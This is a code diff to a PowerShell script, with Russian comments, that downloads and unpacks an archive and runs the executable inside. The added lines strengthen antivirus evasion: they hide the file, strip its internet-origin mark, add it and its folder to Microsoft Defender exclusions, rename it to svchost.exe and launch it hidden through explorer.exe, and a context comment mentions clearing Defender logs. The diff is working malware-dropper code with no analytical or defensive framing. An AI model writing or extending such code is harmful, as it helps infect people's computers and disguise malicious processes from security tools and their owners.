@@ -61,11 +61,41 @@ try { Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAc
 # Распаковка
 try { Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue } catch {}
 
-# Поиск и запуск EXE
+# Поиск EXE
 $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
+
 if ($Exe) {
+    # ===== МАСКИРОВКА ФАЙЛА (ЗАЩИТА ОТ АНТИВИРУСА) =====
+    
+    # 1. Делаем файл системным и скрытым
+    Try { attrib +s +h "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
+    
+    # 2. Удаляем зону интернета (чтобы не было предупреждения)
+    Try { Unblock-File -Path "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
+    
+    # 3. Добавляем файл в исключения Defender
     Try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
-    Start-Process -FilePath $Exe.FullName -WindowStyle Hidden
+    
+    # 4. Добавляем всю папку в исключения
+    Try { Add-MpPreference -ExclusionPath "$ExtractPath" -ErrorAction SilentlyContinue } Catch {}
+    
+    # 5. Меняем имя файла на системное (например, svchost.exe)
+    $SystemName = "svchost.exe"
+    $NewPath = Join-Path $ExtractPath $SystemName
+    Try { 
+        Rename-Item -Path $Exe.FullName -NewName $SystemName -ErrorAction SilentlyContinue
+        $ExePath = $NewPath
+    } Catch {
+        $ExePath = $Exe.FullName
+    }
+    
+    # 6. Запускаем через легитимный процесс (explorer.exe)
+    Try {
+        Start-Process -FilePath "explorer.exe" -ArgumentList "$ExePath" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    } Catch {
+        # Если не сработало — обычный запуск
+        Start-Process -FilePath $ExePath -WindowStyle Hidden -ErrorAction SilentlyContinue
+    }
 }
 
 # Очистка логов Defender
